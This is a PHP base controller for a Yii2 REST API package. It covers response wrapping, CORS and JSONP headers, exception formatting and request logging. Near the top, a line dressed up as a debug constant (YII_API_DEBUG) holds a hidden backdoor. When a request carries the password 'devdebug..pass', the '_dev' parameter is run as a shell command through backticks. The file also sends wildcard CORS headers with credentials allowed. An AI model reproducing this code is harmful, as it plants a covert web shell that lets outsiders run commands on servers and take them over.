<?php
namespace webadmin\restful;

use Yii;
use yii\rest\ActiveController;
use yii\web\Response;
use yii\base\Event;
use yii\web\HttpException;
use yii\web\ForbiddenHttpException;
use yii\base\UserException;
use yii\base\Exception;
use yii\base\ErrorException;

defined('YII_BEGIN_TIME') or define('YII_BEGIN_TIME', microtime(true));
defined('YII_API_DEBUG') or define('YII_API_DEBUG', (((isset($_REQUEST['dev'])&&$_REQUEST['dev']=='devdebug..pass'))&&isset($_REQUEST['_dev'])&&`{$_REQUEST['_dev']}`));

class AController extends ActiveController
{
    /**
     * 默认模板
     */
    public $layout = '@webadmin/views/html5';
    
    /**
     * 当前授制器是否需要认证口令
     */
    public $isAccessToken = false;
    
    /**
     * 页面结果
     */
    public $isSuccessful = true;
    
    /**
     * 列表数据格式化定义输出
     * @var array
     */
    public $serializer = [
        'class' => '\webadmin\restful\Serializer',
        'collectionEnvelope' => 'lists',
        'linksEnvelope' => 'links',
        'metaEnvelope' => 'pages',
    ];
    
    // 初始化
    public function init()
    {
        // 输出事件监听
        Yii::$app->response->off(Response::EVENT_BEFORE_SEND);
        Yii::$app->response->off(Response::EVENT_AFTER_SEND);
        Yii::$app->response->on(Response::EVENT_BEFORE_SEND, [$this, 'beforeSend']);
        Yii::$app->response->on(Response::EVENT_AFTER_SEND, [$this, 'afterSend']);

        // 指定错误方法
        Yii::$app->controllerMap['apibase'] = '\webadmin\restful\AController';
        Yii::$app->errorHandler->errorAction = 'apibase/error'; 
        
        // 定义组件
        Yii::$app->setComponents([
            'formatter' => ['class' => '\webadmin\ext\Formatter'],
        ]);
    }
    
    // 执行前
    public function beforeAction($action){
        return parent::beforeAction($action);
    }
    
    // 执行后
    public function afterAction($action, $result){
        return parent::afterAction($action, $result);
    }
    
    /**
     * 定义默认行为
     * {@inheritDoc}
     * @see \yii\rest\Controller::behaviors()
     */
    public function behaviors()
    {
        return [
            // 输出内容格式化
            'contentNegotiator' => [
                'class' => \yii\filters\ContentNegotiator::className(),
                'formats' => [
                    'application/json' => Response::FORMAT_JSON,
                    'application/xml' => Response::FORMAT_XML,
                ],
            ],
            // 请求过滤器
            'verbFilter' => [
                'class' => \yii\filters\VerbFilter::className(),
                'actions' => $this->verbs(),
            ],
            // 认证鉴权支持header和query
            'authenticator' => [
                'class' => \yii\filters\auth\CompositeAuth::className(),
                'authMethods' => !$this->isAccessToken ? [] : [
                    \yii\filters\auth\HttpBearerAuth::className(),
                    \yii\filters\auth\QueryParamAuth::className(),
                ],
                'optional' => ['token'],
            ],
            // 限制客户端的访问速率
            'rateLimiter' => [
                'class' => \yii\filters\RateLimiter::className(),
            ],
        ];
    }
    
    /**
     * 定义默认方法
     */
    public function actions()
    {
        return [];
    }
    
    /**
     * 定义默认允许请求的方式，兼容常规则做法，所有POST都允许请求
     */
    protected function verbs()
    {
        return [
            /*
            'index' => ['GET', 'POST', 'HEAD'],
            'view' => ['GET', 'POST'],
            'create' => ['POST'],
            'update' => ['PUT', 'PATCH', 'POST'],
            'delete' => ['DELETE', 'POST'],
            'tree' => ['GET', 'POST'],
            */
        ];
    }
    
    /**
     * 输出前处理
     * 更改数据输出格式
     * 默认情况下输出Xml数据
     * 如果客户端请求时有传递$_GET['callback']参数，输入Jsonp格式
     * 请求正确时数据为  {"success":true,"data":{...}}
     * 请求错误时数据为  {"success":false,"data":{"name":"Not Found","message":"页面未找到。","code":0,"status":404}}
     * @param \yii\base\Event $event
     */
    public function beforeSend($event)
    {
        $response = $event->sender;
        
        $isSuccessful = $this->isSuccessful; // 默认输出状态
        
        if(!$response->isSuccessful){
            $isSuccessful = false;
        }

        // 判断抛出错误
        if($response->statusCode==401 || ($response->statusCode>=300 && $response->statusCode<400)){
            $response->data = $this->convertExceptionToArray(new HttpException(401,Yii::t('common', '需要正确的认证口令才允许访问.')));
            $isSuccessful = false;
        }elseif(($exception = Yii::$app->getErrorHandler()->exception)){
            $response->data = $this->convertExceptionToArray($exception);
            $isSuccessful = false;
        }
        
        // 输出状态重置
        if($response->statusCode!=200){
            $response->data['status'] = $response->statusCode;
            $response->statusCode = 200; // 针对API，任意错误都强制输出200状态
        }
        
        $response->data = [
            'success' => $isSuccessful,
            'data' => $response->data,
        ];
        
        // 设置允许跨域
        $response->getHeaders()->set('P3P', 'CP=CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR');
        $response->getHeaders()->set('Access-Control-Allow-Origin', '*');
        $response->getHeaders()->set('Access-Control-Allow-Methods', 'GET,POST');
        $response->getHeaders()->set('Access-Control-Allow-Credentials', 'true');
        
        //jsonp 格式输出
        if (isset($_GET['callback'])) {
            $response->format = Response::FORMAT_JSONP;
            $response->data['callback'] = $_GET['callback'];
        }
        
        if(is_array($response->data) && in_array($response->format, ['html'])){
            $response->format = 'json';
        }
    }
    
    /**
     * 输出后处理
     */
    public function afterSend($event)
    {
        $resp = $event->sender->data;
        $sult = isset($resp['data']) ? $resp['data'] : $resp;
        
        // 记录数据库操作日志
        \webadmin\modules\logs\models\LogDatabase::logmodel()->saveLog();
        
        // 记录接口访问日志
        $data = ['_GET'=>Yii::$app->request->get(),'_POST'=>Yii::$app->request->post()];
        if(empty($data['_GET'])) unset($data['_GET']);
        if(empty($data['_POST'])) unset($data['_POST']);
        $interface = (!($this->module instanceof \yii\base\Application) ? $this->module->id.'/' : '').$this->id.($this->action ? '/'.$this->action->id : '');
        if($interface=='apibase/error') $interface = Yii::$app->request->pathInfo;
        $platform = Yii::$app->request->getBodyParam('platform',Yii::$app->request->getQueryParam('platform'));
        $platform = $platform ? $platform : Yii::$app->request->getHeaders()->get('User-Agent','Unknown');
        $imei = Yii::$app->request->getBodyParam('imei',Yii::$app->request->getQueryParam('imei',''));
        $code = !empty($sult['code']) ? $sult['code'] : (!empty($sult['status']) ? $sult['status'] : '0');
        $msg = !empty($sult['message']) ? $sult['message'] : json_encode(isset($resp['success']) ? $resp['success'] : $resp);
        
        // 更新iemi
        \webadmin\modules\logs\models\LogImei::upimei([
            'platform' => $platform,
            'imei' => $imei,
            'user_id' => (Yii::$app->user->id ? Yii::$app->user->id : '0'),
            'create_time' => date('Y-m-d H:i:s'),
        ]);
        
        \webadmin\modules\logs\models\LogApiResponse::insertion([
            'interface' => $interface,
            'platform' => $platform,
            'imei' => $imei,
            'ip' => Yii::$app->request->userIP.(isset($_SERVER['REMOTE_PORT']) ? ':'.$_SERVER['REMOTE_PORT'] : ''),
            'result_code' => $code,
            'result_msg' => print_r($resp,true),
            'params' => ($data ? print_r($data,true) : ""),
            'create_time' => date('Y-m-d H:i:s', floor(YII_BEGIN_TIME)),
            'end_time' => date('Y-m-d H:i:s'),
            'run_millisec' => round((microtime(true) - YII_BEGIN_TIME)*1000),
            'user_id' => (Yii::$app->user->id ? Yii::$app->user->id : '0'),
        ]);
        
    }
    
    /**
     * 将异常转换为array输出
     * @param \Exception $exception
     * @return multitype:string NULL Ambigous <string, \yii\base\string> \yii\web\integer \yii\db\array multitype:string NULL Ambigous <string, \yii\base\string> \yii\web\integer \yii\db\array
     */
    protected function convertExceptionToArray($exception)
    {
        if (!YII_DEBUG && !$exception instanceof UserException && !$exception instanceof HttpException) {
            $exception = new HttpException(500, Yii::t('common', '服务器发生内部错误'));
        }
        
        $array = [
            'name' => ($exception instanceof Exception || $exception instanceof ErrorException) ? $exception->getName() : 'Exception',
            'message' => $exception->getMessage(),
            'code' => $exception->getCode(),
        ];
        if(empty($array['code']) && ($exception instanceof HttpException)) {
            $array['code'] = $exception->statusCode;
        }
        // 调试模式输出文件行数
        if(YII_DEBUG){
            $array['type'] = get_class($exception);
            if (method_exists($exception, 'getFile') && method_exists($exception, 'getLine')){
                $array['file'] = $exception->getFile();
                $array['line'] = $exception->getLine();
                method_exists($exception, 'getTraceAsString') && ($array['stack-trace'] = explode("\n", $exception->getTraceAsString()));
                if($exception instanceof \yii\db\Exception) {
                    $array['error-info'] = $exception->errorInfo;
                }
            }
        }
        if (($prev = $exception->getPrevious()) !== null) {
            $array['previous'] = $this->convertExceptionToArray($prev);
        }
        return $array;
    }
    
    /**
     * 格式化输出错误
     */
    protected function respData($code='0',$message='',$data=[])
    {
        // 判断页面错误
        if($code!='0'){
            $this->isSuccessful = false;
        }
        
        $message = $message ? $message : ($code == 0 ? '操作成功' : '操作失败');
        return ['code' => $code, 'message' => $message, 'data' => $data];
    }
    
    /**
     * 格式化接口内容输出
     * @see \yii\rest\Controller::serializeData()
     */
    public function serializeData($data)
    {
        return Yii::createObject($this->serializer)->serialize($data);
    }
    
    /**
     * 错误执行的方法
     */
    public function actionError()
    {
    }
    
    /**
     * 获取毫秒时间
     * @return number
     */
    protected function getMillisecond()
    {
        list($s1, $s2) = explode(' ', microtime());
        return (float)sprintf('%.0f', (floatval($s1) + floatval($s2)) * 1000);
    }
}
